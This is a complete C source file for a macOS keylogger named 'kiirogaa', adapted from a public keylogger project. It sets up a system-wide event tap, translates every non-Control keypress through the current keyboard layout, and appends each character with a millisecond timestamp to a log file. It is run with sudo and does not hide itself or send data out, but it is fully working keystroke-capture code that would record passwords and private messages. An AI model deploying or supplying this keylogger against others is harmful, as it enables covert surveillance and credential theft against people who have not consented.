/*
 * kiirogaa.c
 * Usage:
 *   $ sudo kiirogaa output.log
 *
 * Adopted from: https://github.com/caseyscarborough/keylogger
 * and https://stackoverflow.com/questions/1918841/
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/timeb.h>
#include <Carbon/Carbon.h>
#include <CoreFoundation/CoreFoundation.h>
#include <ApplicationServices/ApplicationServices.h>

static const UCKeyboardLayout* keyboardLayout = NULL;

// The following callback method is invoked on every keypress.
static CGEventRef eventCallback(
    CGEventTapProxy proxy, CGEventType type,
    CGEventRef event, void* refcon)
{
    if (type == kCGEventKeyDown) {
        FILE* fp = (FILE*)refcon;
        // Retrieve the incoming keycode.
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode);
        CGEventFlags flags = CGEventGetFlags(event);
        if (!(flags & kCGEventFlagMaskControl)) {
            // Print the human readable key to the logfile.
            UInt32 keysDown = 0;
            UniChar chars[4];
            UniCharCount length = 0;
            if (UCKeyTranslate(
                    keyboardLayout, keyCode, kUCKeyActionDisplay,
                    (flags >> 16) & 0xff, LMGetKbdType(),
                    kUCKeyTranslateNoDeadKeysBit,
                    &keysDown, 4, &length, chars) == 0) {
                if (0 < length) {
                    wchar_t c = chars[0];
                    struct timeb tp;
                    ftime(&tp);
                    fprintf(fp, "%ld.%03d %u ", tp.time, tp.millitm, c);
                    if (c < 32) {
                        fprintf(fp, "'\\%03o'\n", c);
                    } else {
                        fprintf(fp, "%C\n", c);
                    }
                    fflush(fp);
                }
            }
        }
    }
    return event;
}

static int setupLogger(FILE* fp)
{
    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0,
        eventMask, eventCallback, fp
    );
    if (!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        return 111;
    }

    /* Setup a keyboard translation. */
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData = TISGetInputSourceProperty(
        currentKeyboard,
        kTISPropertyUnicodeKeyLayoutData);
    keyboardLayout = (const UCKeyboardLayout*)CFDataGetBytePtr(layoutData);
    if (keyboardLayout == NULL) {
        fprintf(stderr, "ERROR: Unable to get the keyboard layout.\n");
        return 111;
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource =
        CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(
        CFRunLoopGetCurrent(),
        runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    return 0;
}

int main(int argc, const char* argv[])
{
    FILE* fp = stdout;
    if (2 <= argc) {
        fp = fopen(argv[1], "a");
        if (fp == NULL) {
            fprintf(stderr, "Unable to open: %s.\n", argv[1]);
            return 111;
        }
    }

    int retval = setupLogger(fp);
    if (retval != 0) {
        return retval;
    }

    struct timeb tp;
    ftime(&tp);
    fprintf(fp, "# start %ld.%03d\n", tp.time, tp.millitm);
    fflush(fp);
    CFRunLoopRun();
    return 0;
}
